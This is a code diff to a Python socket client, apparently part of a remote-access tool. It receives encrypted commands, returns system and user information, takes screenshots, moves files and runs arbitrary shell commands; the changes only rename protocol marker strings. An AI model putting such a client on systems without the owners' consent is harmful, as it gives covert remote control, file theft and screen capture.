@@ -281,7 +281,7 @@ class Client(object):
     def receive(self) -> bytes:
         """ Receives Buffer Size and Data from Server Encrypted with AES """
         length = int(self.Fer.decrypt(self.socket.recv(2048)).decode())
-        self.socket.send(b'<RECEIVED>')
+        self.socket.send(b'RECEIVED')
         return self.Fer.decrypt(self.recvall(length))
 
     def send(self, data) -> None:
@@ -297,12 +297,12 @@ class Client(object):
             for line in read_file(file_to_transfer):
                 self.send(line)
                 self.receive()
-            self.send(b'<FILE TRANSFER DONE>')
+            self.send(b'FILE_TRANSFER_DONE')
             self.receive()
             self.send(b'File Transferred Successfully')
             logging.info('Transferred {} to Server'.format(file_to_transfer))
         except Exception as e:
-            self.send(b'<FILE TRANSFER DONE>')
+            self.send(b'FILE_TRANSFER_DONE')
             self.receive()
             self.send(errors(e).encode())
             logging.info(errors(e))
@@ -310,15 +310,15 @@ class Client(object):
 
     def receive_file(self, save_as) -> None:
         """ Receive File from Server"""
-        self.send(b'<RECEIVED>')
+        self.send(b'RECEIVED')
         with open(save_as, 'wb') as f:
             while 1:
                 data = self.receive()
-                if data == b'<FILE TRANSFER DONE>':
+                if data == b'FILE_TRANSFER_DONE':
                     self.send(b'File Transferred Successfully')
                     break
                 f.write(data)
-                self.send(b'<RECEIVED>')
+                self.send(b'RECEIVED')
         logging.info('Transferred {} to Client'.format(save_as))
         return
 
@@ -335,11 +335,11 @@ class Client(object):
                 self.send(LOG.encode())
                 continue
 
-            if data[0] == '<PLATFORM>':
+            if data[0] == 'PLATFORM':
                 self.send(platform.system().encode())
                 continue
 
-            if data[0] == '<INFO>':
+            if data[0] == '_INFO':
                 self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
                 continue
 
@@ -393,11 +393,11 @@ class Client(object):
                 self.socket.send(b' ')
                 continue
 
-            if data[0] == '<LISTENING>':
-                self.send(b'<DONE>')
+            if data[0] == 'LISTENING':
+                self.send(b'DONE')
                 continue
 
-            if data[0] == 'RECEIVE FILE':
+            if data[0] == 'RECEIVE_FILE':
                 self.send_file(data[1])
                 continue
 
@@ -436,7 +436,7 @@ class Client(object):
                 try:
                     pyscreeze.screenshot(_file)
                 except Exception as e:
-                    self.send(b'<ERROR>')
+                    self.send(b'ERROR')
                     self.receive()
                     self.send(errors(e).encode())
                     continue
@@ -480,7 +480,7 @@ class Client(object):
                     self.send(json_dumps([False, errors(e)]))
                 continue
 
-            if data[0] == '<GETCWD>':
+            if data[0] == 'GETCWD':
                 self.send(os.getcwdb())
                 continue
 
@@ -497,12 +497,12 @@ class Client(object):
                         newlines = output.count('\n')
                         if newlines > 1:
                             process = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                            self.send(json.dumps(['<ERROR>', process.stdout.read().decode()]).encode())
+                            self.send(json.dumps(['ERROR', process.stdout.read().decode()]).encode())
                         else:
                             os.chdir(output.replace('\n', '').replace('\r', ''))
                             self.send(json.dumps([os.getcwd()]).encode())
                     else:
-                        self.send(json.dumps(['<ERROR>', error]).encode())
+                        self.send(json.dumps(['ERROR', error]).encode())
                     continue
 
                 if len(data[1]) > 0:
@@ -518,7 +518,7 @@ class Client(object):
                             break
                     self.send(process.stderr.read())
                     self.receive()
-                    self.send(b'<DONE>')
+                    self.send(b'DONE')
                     continue
 
 
